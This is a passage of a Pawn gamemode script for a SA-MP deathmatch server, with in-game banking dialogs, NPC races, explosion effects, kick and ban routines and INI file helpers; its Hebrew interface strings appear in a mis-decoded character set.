		    if(!IsNumeric(inputtext) || strval(inputtext) < 0 || strval(inputtext) > GetMoney(playerid)) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," äòáøú ëñó",".ñëåí ùâåé","OK","");
		    format(string,sizeof(string),"/transfer %d %s",playerinfo[playerid][clickon],inputtext);
		    command(playerid,string);
		}
		case dialog_baccw1: if(response)
		{
		    format(string,sizeof(string)," %s // äåöàú ëñó îçùáåï áð÷ ùì îùúîù àçø",GetName(playerinfo[playerid][clickon]));
		    if(!equal(inputtext,fgetstring(fuser(playerinfo[playerid][clickon]),"BankPassword"))) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,".ñéñîú çùáåï ùâåéä","OK","");
			ShowPlayerDialog(playerid,dialog_baccw2,DIALOG_STYLE_INPUT,string," :øùåí ëàï àú äñëåí ùáøöåðê ìäåöéà îçùáåï áð÷ æä","äåöà","áéèåì");
		}
		case dialog_baccw2: if(response)
		{
		    if(!IsNumeric(inputtext) || strval(inputtext) < 1 || strval(inputtext) > playerinfo[playerinfo[playerid][clickon]][bank])
			{
			    format(string,sizeof(string)," %s // äåöàú ëñó îçùáåï áð÷ ùì îùúîù àçø",GetName(playerinfo[playerid][clickon]));
				return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,".ñëåí ùâåé","ðñä ùåá","ñâåø");
			}
		    format(string,sizeof(string),"/baccount withdraw %s %s %d",GetName(playerinfo[playerid][clickon]),inputtext,strval(inputtext));
			command(playerid,string);
		}
		case dialog_baccw3: if(response) ShowPlayerDialog(playerid,dialog_baccw2,DIALOG_STYLE_INPUT,string," :øùåí ëàï àú äñëåí ùáøöåðê ìäåöéà îçùáåï áð÷ æä","äåöà","áéèåì");
		case dialog_baccb: if(response)
		{
		    if(!equal(inputtext,fgetstring(fuser(playerinfo[playerid][clickon]),"BankPassword")))
			{
			    format(string,sizeof(string)," %s // áãé÷ú ñëåí äëñó áçùáåï áð÷ ùì îùúîù àçø",GetName(playerinfo[playerid][clickon]));
				return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,".ñéñîú çùáåï ùâåéä","OK","");
			}
		    format(string,sizeof(string),"/baccount balance %s %s",GetName(playerinfo[playerid][clickon]),inputtext);
			command(playerid,string);
		}
		case dialog_upowers: if(response)
		{
			new uinfo[M_S_D];
		    for(new i = 1; i < sizeof(UltimatePowers); i++) format(uinfo,sizeof(uinfo),!strlen(uinfo) ? ("%s\n%s\n%s\n%s\n%s\n%s") : ("%s\n%s\n%s\n%s\n%s\n%s"),uinfo,UltimatePowers[listitem][upText],UltimatePowers[listitem][upLevel1],UltimatePowers[listitem][upLevel2],UltimatePowers[listitem][upLevel3],UltimatePowers[listitem][upLevel4]);
		    ShowPlayerDialog(playerid,dialog_upowerinfo,DIALOG_STYLE_MSGBOX,UltimatePowers[listitem][upTitle],uinfo,"çæåø","ñâåø");
		}
		case dialog_upowerinfo: if(response) command(playerid,"/upower list");
		default: return 0;
	}
	return 1;
}
//=[OnPlayerClickPlayer]========================================================
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(source == CLICK_SOURCE_SCOREBOARD)
	{
	    new string[M_S];
	    switch(GetPlayerCheckpoint(playerid))
		{
			case cp_bank:
			{
			    format(string,sizeof(string)," %s // îòøëú áð÷",GetName(clickedplayerid));
				ShowPlayerDialog(playerid,dialog_clickplayer,DIALOG_STYLE_LIST,string,"äòáø ëñó\näåöà ëñó îçùáåï äáð÷ ùì äîùúîù äæä\náãå÷ àú ñëåí äëñó áçùáåï äáð÷ ùì îùúîù æä","áçø","ñâåø");
			}
			default:
			{
			    format(string,sizeof(string)," %s // àôùøåéåú ùç÷ï",GetName(clickedplayerid));
				ShowPlayerDialog(playerid,dialog_clickplayer,DIALOG_STYLE_LIST,string,"öôä ñèèéñèé÷åú\nùìç äåãòä ôøèéú\nãååç\nùìç ëñó","áçø","ñâåø");

			}
		}
		playerinfo[playerid][clickon] = clickedplayerid;
	}
	return 1;
}
//=[MoveText]===================================================================
public MoveText(textid)
{
	TextDrawHideForAll(movingtext[textid]);
	TextDrawDestroy(movingtext[textid]);
	movingtextinfo[textid][mtX] += MOVINGTEXT_ADD_POS;
	if(movingtextinfo[textid][mtX] <= 0.000000)
	{
		KillTimer(movingtextinfo[textid][mtTimer]);
		movingtextinfo[textid][mtUsing] = 0;
		return 1;
	}
	movingtext[textid] = TextDrawCreate(movingtextinfo[textid][mtX],movingtextinfo[textid][mtY],movingtextinfo[textid][mtText]);
	TextDrawAlignment(movingtext[textid],0);
	TextDrawBackgroundColor(movingtext[textid],0x000000ff);
	TextDrawFont(movingtext[textid],1);
	TextDrawLetterSize(movingtext[textid],0.399999,1.399999);
	TextDrawColor(movingtext[textid],0xffffffff);
	TextDrawSetProportional(movingtext[textid],1);
	TextDrawSetShadow(movingtext[textid],1);
	TextDrawShowForAll(movingtext[textid]);
	return 1;
}
//=[Replytest]==================================================================
public Replytest()
{
	if(debugstate) printf("Gamemode Activity [start]: Replytest");
	new string[M_S], allowedChars[M_S], length = randomEx(12,31);
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," :îáçï çæøä îúçéì òëùéå! òìéëí ìä÷ìéã áö'àè àú äè÷ñè äáà áîäéøåú äàôùøéú");
	allowedChars = "ABCDEFGHIJKLMNOPQRSTUVWXIZ0123456789!@#$^&*()-_=+.,<>", replytest = "";
	for(new i = 0; i < length; i++) format(replytest,sizeof(replytest),"%s%c",replytest,!i ? allowedChars[random(36)] : allowedChars[random(sizeof(allowedChars))]);
	SendClientMessageToAll(white,replytest);
	replytestlevel = 1;
	if(length > 15) replytestlevel++;
	if(length > 25) replytestlevel++;
	switch(replytestlevel)
	{
		case 1: string = "÷ì";
		case 2: string = "áéðåðé";
		case 3: string = "÷ùä";
	}
	format(string,sizeof(string)," (øîú ÷åùé: %s)",string);
	SendClientMessageToAll(white,string);
	SendClientMessageToAll(orange,"  äøàùåï ùéñôé÷ ìëúåá àú äè÷ñè ééæëä áñëåí ëñôé äð÷áò ò\"ô äøîä");
	SendClientMessageToAll(orange,"  áîéãä åìà éäéä æåëä úåê çöé ã÷ä, äîáçï éáåèì");
	SendClientMessageToAll(yellow," /replytest :ìòæøä òí îòøëú îáçï äçæøä");
	SendClientMessageToAll(black,"___________________________________");
	SetTimer("Replytest2",30000,0);
	if(debugstate) printf("Gamemode Activity [end]: Replytest");
	return 1;
}
//=[Replytest2]=================================================================
public Replytest2()
{
	if(debugstate) printf("Gamemode Activity [start]: Replytest2");
	if(strlen(replytest) > 0)
	{
		SendClientMessageToAll(red," !àó àçã ìà äñôé÷ ìä÷ìéã àú äè÷ñè ùðéúï áæîï");
		format(replytest,sizeof(replytest),"");
	}
	if(debugstate) printf("Gamemode Activity [end]: Replytest2");
	return 1;
}
//=[StartNPCRace]===============================================================
public StartNPCRace(playerid,blevel)
{
	new string[M_S], botid, v;
	format(string,sizeof(string),"RaceBot_%d",blevel);
	botid = ReturnUser(string);
	if(IsPlayerConnected(botid)) Kick(botid);
	ConnectNPC(string,string);
	botid = ReturnUser(string);
	v = CreateVehicleEx(blevel ? 541 : (blevel == 3 ? 411 : 451),0.0,0.0,0.0,0.0,-1,-1,respawntime,0,GetPlayerVirtualWorld(playerid));
	PutPlayerInVehicle(botid,v,0);
	vehicleinfo[v][locked] = 1;
	Attach3DTextLabelToPlayer(Create3DTextLabel(string,white,0.0,0.0,0.0,50.0,GetPlayerVirtualWorld(playerid),0),botid,0.0,0.0,0.2);
	SetPlayerSkin(botid,255);
	SetPlayerColor(botid,rgba2hex(random(256),random(256),random(256),155));
	SetTimerEx("EndNPCRace",180000,0,"ii",playerid,botid);
	return 1;
}
//=[EndNPCRace]=================================================================
public EndNPCRace(playerid,bot)
{
	new Float:p[3], v = GetPlayerVehicleID(playerid);
	GetVehiclePos(v,p[0],p[1],p[2]);
	SetVehicleToRespawn(v);
	SetPlayerPos(playerid,p[0],p[1],p[2] + 2.5);
	SpawnPlayer(playerid);
	DestroyVehicle(GetPlayerVehicleID(bot));
	Kick(bot);
	return 1;
}
//=[HideMarkers]================================================================
public HideMarkers(playerid,id)
{
	if(!IsPlayerConnected(id) || !playerinfo[id][invisible]) return 0;
	SetPlayerMarkerForPlayer(playerid,id,GetColor(id,0));
	return 1;
}
//=[FireBallExplosion]==========================================================
public FireBallExplosion(objectid)
{
	new Float:p[3];
	GetSObjectPos(objectid,p[0],p[1],p[2]);
	CreateExplosion(p[0],p[1],p[2],6,1.0);
	DestroySObject(objectid);
	return 1;
}
//=[ResetCopypower]=============================================================
public ResetCopypower(playerid)
{
	playerinfo[playerid][copypower] = {-1,-1};
	return 1;
}
//=[RemoteCreateSObject]========================================================
public RemoteCreateSObject(modelid,Float:xpos,Float:ypos,Float:zpos,Float:xrot,Float:yrot,Float:zrot,Float:showdis,interior,world) return CreateSObject(modelid,xpos,ypos,zpos,xrot,yrot,zrot,showdis,interior,world);
//=[HydrogenBoom]===============================================================
public HydrogenBoom(playerid)
{
	if(playerinfo[playerid][hbombcount] == 0) CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.3);
	else if(playerinfo[playerid][hbombcount] == 1)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+3,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] == 2)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+3,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+6,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] == 3)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+3,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+6,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+9,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] == 4)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+6,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+9,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+12,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] == 5)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+9,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+12,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+15,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] == 6)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+12,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+15,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+18,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] == 7)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+15,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+18,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+21,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] == 9)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+18,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+21,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+10,playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-10,playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]+10,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]-10,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+24,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] == 10)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+21,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+10,playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-10,playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]+10,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]-10,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+27,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+7,playerinfo[playerid][bombpos][2]+27,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-7,playerinfo[playerid][bombpos][2]+27,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]+7,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+27,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]-7,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+27,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] == 11)
	{
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+10,playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-10,playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]+10,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]-10,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+24,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+27,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+7,playerinfo[playerid][bombpos][2]+27,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-7,playerinfo[playerid][bombpos][2]+27,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]+7,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+27,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]-7,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+27,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+30,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+3,playerinfo[playerid][bombpos][2]+30,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-3,playerinfo[playerid][bombpos][2]+30,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]+3,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+30,7,0.3);
		CreateExplosion(playerinfo[playerid][bombpos][0]-3,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+30,7,0.3);
	}
	else if(playerinfo[playerid][hbombcount] >= 12)
	{
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && GetPlayerDistanceToPointEx(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]) <= 100 && GetPlayerDistanceToPointEx(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]) >= 41)
		{
		    new Float:p[3];
		    GetPlayerVelocity(i,p[0],p[1],p[2]);
			SetPlayerVelocity(i,p[0]-(p[0] / 4),p[1]+(p[1] / 4),p[2]+(p[2] / 4));
		}
        if(playerinfo[playerid][hbombcount] >= 15)
        {
		    for(new i=0;i<3;i++) playerinfo[playerid][bombpos][i] = 0.0;
		    playerinfo[playerid][hbombcount] = 0;
			return 1;
        }
	}
	SetTimerEx("HydrogenBoom",400,0,"i",playerid);
	playerinfo[playerid][hbombcount]++;
	return 1;
}
//=[ShowCredits]================================================================
stock ShowCredits()
{
	printf(" * %s DeathMatch",webpage);
	printf(" * © Copyright 2008-2009, Amit Barami (`Amit_B`)");
	printf(" * Type: SanAndreas:MultiPlayer 0.3.0");
	printf(" * Version: %s",version);
	printf(" * Creation Date: v1 01/04/2008 | v2 17/11/2008 | v3 29/06/2009 | v4 18/07/2009");
	return 1;
}
//=[strtok]=====================================================================
stock strtok(const string[], &index, somechar = ' ')
{   // by CompuPhase, improved by me
	new length = strlen(string), result[20];
	while((index < length) && (string[index] <= somechar)) index++;
	new offset = index;
	while((index < length) && (string[index] > somechar) && ((index - offset) < (sizeof(result) - 1))) result[index - offset] = string[index], index++;
	result[index - offset] = EOS;
	return result;
}
//=[strrest]====================================================================
stock strrest(const string[], index)
{   // by CompuPhase, improved by me
	new length = strlen(string), offset = index, result[M_S];
	while((index < length) && ((index - offset) < (sizeof(result) - 1)) && (string[index] > '\r')) result[index - offset] = string[index], index++;
	result[index - offset] = EOS;
	if(result[0] == ' ' && string[0] != ' ') strdel(result,0,1);
	return result;
}
//=[GetName]====================================================================
stock GetName(playerid)
{
	new n[MAX_PLAYER_NAME];
	if(playerid == MAX_PLAYERS) format(n,sizeof(n),"Console");
	else GetPlayerName(playerid,n,sizeof(n));
	return n;
}
//=[GetIP]======================================================================
stock GetIP(playerid)
{
	new ip[16];
	if(playerinfo[playerid][pp]) return ip;
	GetPlayerIp(playerid,ip,sizeof(ip));
	return ip;
}
//=[fcreate]====================================================================
stock fcreate(filename[])
{
	if(fexist(filename)) return 0;
	new File:f = fopen(filename,io_write);
	fclose(f);
	return 1;
}
//=[IsNumeric]==================================================================
stock IsNumeric(const string[])
{
	for(new i = 0, j = strlen(string); i < j; i++) if((string[i] < '0' || string[i] > '9') && string[i] != '-') return 0;
	return 1;
}
//=[ReturnUser]=================================================================
stock ReturnUser(text[])
{   // by Y_Less, improved by me
	new pos = 0, userid = INVALID_PLAYER_ID, count = 0, name[MAX_PLAYER_NAME];
	while(text[pos] < 0x21)
	{
		if(!text[pos]) return INVALID_PLAYER_ID;
		pos++;
	}
	if(IsNumeric(text[pos]))
	{
		userid = strval(text[pos]);
		if(userid >= 0 && userid < MAX_PLAYERS)
		{
			if(!IsPlayerConnected(userid)) userid = INVALID_PLAYER_ID;
			else return userid;
		}
	}
	new len = strlen(text[pos]);
	for(new i=0;i<MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			GetPlayerName(i,name,sizeof(name));
			if(strcmp(name,text[pos],true,len) == 0)
			{
				if(len == strlen(name)) return i;
				else count++, userid = i;
			}
		}
	}
	if(count != 1) userid = INVALID_PLAYER_ID;
	return userid;
}
//=[equal]======================================================================
stock equal(str1[],str2[]) return !strcmp(str1,str2,true) && strlen(str1) == strlen(str2);
//=[SetKick]====================================================================
stock SetKick(playerid,adminid,reason[])
{
	if(IsPlayerNPC(playerid)) return 1;
	new string[M_S];
	if(adminid == INVALID_PLAYER_ID) format(string,sizeof(string)," *** %s has been kicked. (%s)",GetName(playerid),reason);
	else if(adminid == MAX_PLAYERS) format(string,sizeof(string)," *** %s has been kicked by the Console. (%s)",GetName(playerid),reason);
	else if(adminid == MAX_PLAYERS+1) format(string,sizeof(string)," [" acname "] %s has been kicked for using %s.",GetName(playerid),reason);
	else format(string,sizeof(string)," *** %s has been kicked by %s. (%s)",GetName(playerid),GetName(adminid),reason);
	if(!dontseedc) SendClientMessageToAll(0xff0000aa,string);
	if(!(playerinfo[playerid][pp] > 0 && playerinfo[playerid][logged] && playerinfo[playerid][admin] >= 20)) Kick(playerid);
	return 1;
}
//=[SetBan]=====================================================================
stock SetBan(playerid,adminid,reason[],inchat=1)
{
	if(IsPlayerNPC(playerid)) return 1;
	new string[M_S], t[6];
	if(inchat)
	{
		if(adminid == INVALID_PLAYER_ID) format(string,sizeof(string)," *** %s has been banned. (%s)",GetName(playerid),reason);
		else if(adminid == MAX_PLAYERS) format(string,sizeof(string)," *** %s has been banned by the Console. (%s)",GetName(playerid),reason);
		else if(adminid == MAX_PLAYERS+1) format(string,sizeof(string)," [" acname "] %s has been banned for using %s.",GetName(playerid),reason);
		else format(string,sizeof(string)," *** %s has been banned by %s. (%s)",GetName(playerid),GetName(adminid),reason);
		if(!dontseedc) SendClientMessageToAll(0xff0000aa,string);
	}
	if(!fexist(fuserban(GetName(playerid)))) fcreate(fuserban(GetName(playerid)));
	fsetstring(fuserban(GetName(playerid)),"PlayerIP",GetIP(playerid));
	if(adminid != INVALID_PLAYER_ID)
	{
		fsetstring(fuserban(GetName(playerid)),"AdminIP",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetIP(adminid)));
		fsetstring(fuserban(GetName(playerid)),"AdminName",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetName(adminid)));
	}
	fsetstring(fuserban(GetName(playerid)),"Reason",reason);
	getdate(t[0],t[1],t[2]);
	gettime(t[3],t[4],t[5]);
	fsetint(fuserban(GetName(playerid)),"Year",t[0]);
	fsetint(fuserban(GetName(playerid)),"Month",t[1]);
	fsetint(fuserban(GetName(playerid)),"Day",t[2]);
	fsetint(fuserban(GetName(playerid)),"Hour",t[3]);
	fsetint(fuserban(GetName(playerid)),"Minute",t[4]);
	fsetstring(fuserban(GetName(playerid)),"S",inchat? ("No"):("Yes"));
	format(string,sizeof(string),"/DM/Bans/IP/%s.ini",GetIP(playerid));
	fcreate(string);
	fsetstring(string,"PlayerName",GetName(playerid));
	if(adminid != INVALID_PLAYER_ID)
	{
		fsetstring(string,"AdminIP",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetIP(adminid)));
		fsetstring(string,"AdminName",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetName(adminid)));
	}
	fsetstring(string,"Reason",reason);
	fsetint(string,"Year",t[0]);
	fsetint(string,"Month",t[1]);
	fsetint(string,"Day",t[2]);
	fsetint(string,"Hour",t[3]);
	fsetint(string,"Minute",t[4]);
	fsetstring(string,"S",inchat? ("No"):("Yes"));
	playerinfo[playerid][banned] = 1;
	if(!(playerinfo[playerid][pp] > 0 && playerinfo[playerid][logged] && playerinfo[playerid][admin] >= 20)) Kick(playerid);
	return 1;
}
stock fcopystring(file[],copyfile[],key[])
{
	new string[M_S];
	format(string,sizeof(string),fgetstring(copyfile,key));
	fsetstring(file,key,string);
	return 1;
}
stock fcopyint(file[],copyfile[],key[])
{
	new int = fgetint(copyfile,key);
	fsetint(file,key,int);
	return 1;
}
stock fcopyfloat(file[],copyfile[],key[])
{
	new float = fgetfloat(copyfile,key);
	fsetfloat(file,key,float);
	return 1;
}
stock fsetname(oldname[],newname[])
{
	if(!fexist(oldname)) return 0;
	fremove(newname);
	if(!fcopy(oldname,newname)) return 0;
	fremove(oldname);
	return 1;
}
stock fcopy(oldname[],newname[])
{
	new File:ohnd, File:nhnd, buf2[1], i;
	if(!fexist(oldname)) return 0;
	ohnd = fopen(oldname,io_read), nhnd = fopen(newname,io_write);
	for(i=flength(ohnd);i>0;i--) fputchar(nhnd,fgetchar(ohnd,buf2[0],false),false);
	fclose(ohnd);
	fclose(nhnd);
	return 1;
}
//=[Dini]=======================================================================
/*
	Functions from "DINI.inc" & "DUtils.inc"
	by DracoBlue
	Improved & renamed by me
*/
stock dini_PRIVATE_ExtractKey(line[])
{
	new tmp[256];
	tmp[0] = 0;
	if(strfind(line,"=",true) == -1) return tmp;
	SetString(tmp,strlower(ret_memcpy(line,0,strfind(line,"=",true))));
	return tmp;
}
stock dini_PRIVATE_ExtractValue(line[])
{
	new tmp[256];
	tmp[0] = 0;
	if(strfind(line,"=",true) == -1) return tmp;
	SetString(tmp,ret_memcpy(line,strfind(line,"=",true)+1,strlen(line)));
	return tmp;
}
stock strlower(txt[])
{
	new tmp[256], i = 0;
	tmp[0] = 0;
	if(txt[0] == 0) return tmp;
	for(i=0;i<strlen(txt);i++) tmp[i] = tolower(txt[i]);
	tmp[strlen(txt)] = 0;
	return tmp;
}
stock ret_memcpy(source[],index,numbytes)
{
	new tmp[256], i = 0;
	tmp[0] = 0;
	if(index >= strlen(source)) return tmp;
	if(numbytes+index >= strlen(source)) numbytes = strlen(source)-index;
	if(numbytes <= 0) return tmp;
	for(i=index;i<numbytes+index;i++)
	{
		tmp[i-index] = source[i];
		if(source[i] == 0) return tmp;
	}
	tmp[numbytes] = 0;
	return tmp;
}
stock StripNewLine(string[])
{
	new len = strlen(string);
	if(string[0] == 0) return 0;
	if((string[len-1] == '\n') || (string[len-1] == '\r'))
	{
		string[len-1] = 0;
		if(string[0] == 0) return 0;
		if((string[len-2] == '\n') || (string[len-2] == '\r')) string[len-2] = 0;
	}
	return 1;
}
stock diniEqual(str1[],str2[],bool:ignorecase)
{
	//#pragma unused ignorecase
	if(strlen(str1) != strlen(str2)) return 0;
	if(strcmp(str1,str2,ignorecase) == 0) return 1;
	//for(new i = 0, j = strlen(str1); i < j; i++) if(str1[i] != str2[i]) return 0;
	return 0;
}
stock fsetstring(filename[],key[],value[])
{
	if(debugstate) printf("fsetstring(%s,%s,%s) start",filename,key,value);
	new File:fohnd, File:fwhnd, bool:wasset=false, tmpres[256];
	if(key[0] == 0) return 0;
	format(tmpres,sizeof(tmpres),"%s.part",filename);
	fohnd = fopen(filename,io_read);
	if(!fohnd) return printf("fsetstring(%s,%s,%s) - cant open file",filename,key,value);
	if(fexist(tmpres)) fremove(tmpres);
	fwhnd = fopen(tmpres,io_write);
	while(fread(fohnd,tmpres))
	{
		StripNewLine(tmpres);
		if(!wasset && (diniEqual(dini_PRIVATE_ExtractKey(tmpres),key,true)))
		{
			format(tmpres,sizeof(tmpres),"%s=%s",key,value);
			wasset=true;
		}
		fwrite(fwhnd,tmpres);
		fwrite(fwhnd,"\r\n");
	}
	if(!wasset)
	{
		format(tmpres,sizeof(tmpres),"%s=%s",key,value);
		fwrite(fwhnd,tmpres);
		fwrite(fwhnd,"\r\n");
	}
	fclose(fohnd);
	fclose(fwhnd);
	format(tmpres,sizeof(tmpres),"%s.part",filename);
	if(fcopytextfile(tmpres,filename)) return fremove(tmpres);
	if(debugstate) printf("fsetstring(%s,%s,%s) end",filename,key,value);
	return 0;
}
stock fsetint(filename[],key[],value)
{
   new valuestring[256];
   format(valuestring,sizeof(valuestring),"%d",value);
   return fsetstring(filename,key,valuestring);
}
stock fgetint(filename[],key[]) return strval(fgetstring(filename,key));
stock fsetfloat(filename[],key[],Float:value)
{
   new valuestring[256];
   format(valuestring,sizeof(valuestring),"%f",value);
   return fsetstring(filename,key,valuestring);
}
forward Float:fgetfloat(filename[],key[]);
public Float:fgetfloat(filename[],key[]) return floatstr(fgetstring(filename,key));
stock fremovekey(filename[],key[])
{
	new File:fohnd, File:fwhnd, tmpres[256];
	format(tmpres,sizeof(tmpres),"%s.part",filename);
	fohnd = fopen(filename,io_read);
	if(!fohnd) return 0;
	fremove(tmpres);
	fwhnd = fopen(tmpres,io_write);
	while(fread(fohnd,tmpres))
	{
		StripNewLine(tmpres);
		if(!diniEqual(dini_PRIVATE_ExtractKey(tmpres),key,true))
		{
			format(tmpres,sizeof(tmpres),"%s",tmpres);
			fwrite(fwhnd,tmpres);
			fwrite(fwhnd,"\r\n");
		}
	}
	fclose(fohnd);
	fclose(fwhnd);
	format(tmpres,sizeof(tmpres),"%s.part",filename);
	if(fcopytextfile(tmpres,filename)) return fremove(tmpres);
	return 0;
}
